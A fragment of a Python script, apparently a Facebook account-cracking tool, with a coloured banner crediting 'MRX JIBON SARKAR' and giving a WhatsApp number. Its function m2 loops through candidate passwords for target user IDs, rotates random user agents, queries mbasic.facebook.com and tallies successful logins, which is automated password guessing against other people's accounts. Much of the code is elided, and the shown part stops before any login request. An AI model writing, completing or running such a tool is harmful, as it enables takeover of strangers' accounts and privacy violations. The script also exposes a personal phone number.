...
logo=("""
 \033[31;1m\033[32;1m   ╦   ╦\x1b[38;5;208m ╔╗\033[31;1m ╔═╗ \033[34;1m ╔╗╔  \033[33;1m
    \033[31;1m\033[32;1m  ║   ║\x1b[38;5;208m ╠╩╗\033[31;1m║ ║ \033[34;1m ║║║  \033[33;1m 
  \033[31;1m\033[32;1m ╚╝   ╩\x1b[38;5;208m ╚═╝\033[31;1m╚═╝ \033[34;1m ╝╚╝  \033[33;1m
\033[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\033[38;5;46m┃ \x1b[38;5;196m√ADMIN\x1b[38;5;196m   :\x1b[1;96   MRX JIBON SARKAR           \033[38;5;46m┃
...
\033[38;5;46m┃ \x1b[1;96mWATHSAPP\x1b[38;5;196m: \033[1;97m+880186554636 \033[38;5;46m┃\033[1;97m\033[1;45mVersion 0.2\033[1;0m\033[1;97m\033[38;5;46m┃
...
def mathod1():
	...
	print(" [\033[1;32m3\033[1;37m] EXAMPLE: \033[1;32m2000 - 5000 - 10000\033[1;37m ")
...
def m2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            session = requests.Session()
            sys.stdout.write(f'\r [JIBON-M2] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
